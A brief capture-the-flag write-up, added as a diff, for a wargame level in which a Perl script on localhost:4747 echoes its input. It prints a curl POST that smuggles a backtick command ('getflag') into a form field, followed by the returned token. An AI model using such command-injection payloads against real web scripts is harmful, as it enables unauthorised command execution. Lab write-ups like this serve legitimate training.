@@ -1,0 +1,6 @@
+# At this level, we can found a level04.pl perl script that echo a given string in parameters when we start the program
+# We can see in comments and in the folders /var/www/level04/... that the script is running background
+# Let's try to send 'getflag' to this script throught curl localhost:4747
+
+curl -d 'x=`getflag`' localhost:4747
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
